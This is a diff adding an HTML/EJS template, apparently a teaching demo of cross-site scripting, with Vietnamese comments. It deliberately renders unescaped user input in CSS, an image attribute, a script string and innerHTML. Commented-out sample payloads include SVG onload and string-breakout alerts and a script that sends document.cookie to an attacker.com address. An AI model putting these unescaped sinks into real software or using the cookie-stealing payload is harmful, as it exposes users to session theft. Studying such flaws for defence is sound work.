@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>XSS Demo</title>
+    <!-- <style>
+      <%= message  %>
+    </style> -->
+    <style>
+      body {
+        background-color: "<%- message %>";
+      }
+    </style>
+    <!--this is inject by CSS-->
+  </head>
+  <body>
+    <h1>XSS Demo</h1>
+    <p>Welcome to the XSS demo! Type something below:</p>
+    <form>
+      <input type="text" name="message" />
+      <button type="submit" id="btn" onclick="displayMessage()">Submit</button>
+    </form>
+    <p>Your input: <%- message %></p>
+    <div id="message"></div>
+    <!--'); alert('XSS via DOM-Based Attack!'); //
+  có thể dùng đoạn mã này để inject vào
+    -->
+    <!--<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS via SVG Attack!')">
+      <circle cx="50" cy="50" r="40" />
+    </svg>
+   ta có thể injection kiểu svg vào để  khi load sẽ thực thi mã script  
+  -->
+    <!-- this is reflect XSS inject javascript to source code-->
+    <div>
+      <img src="<%- message %>" alt="User's Image" />
+      <!--this is XSS via HTML Attributes we can use attribute 's HTML to attack-->
+    </div>
+    <script>
+      document.getElementById("btn").addEventListener("click", function () {
+        var userInput = "<%- message %>";
+        document.write(userInput);
+      });
+      function displayMessage() {
+        var userInput = "<%- message %>";
+        var messageContainer = document.getElementById("message");
+        messageContainer.innerHTML = userInput;
+      }
+    </script>
+    <!-- <script>
+      window.alert("DOM Clobbering Attack!");
+    </script> -->
+
+    <!--<script>
+  window.location.href = 'https://attacker.com/?data=' + encodeURIComponent(document.cookie);
+ </script>
+ có thể inject mã này vào để gửi cookie đến trang web kia-->
+  </body>
+</html>
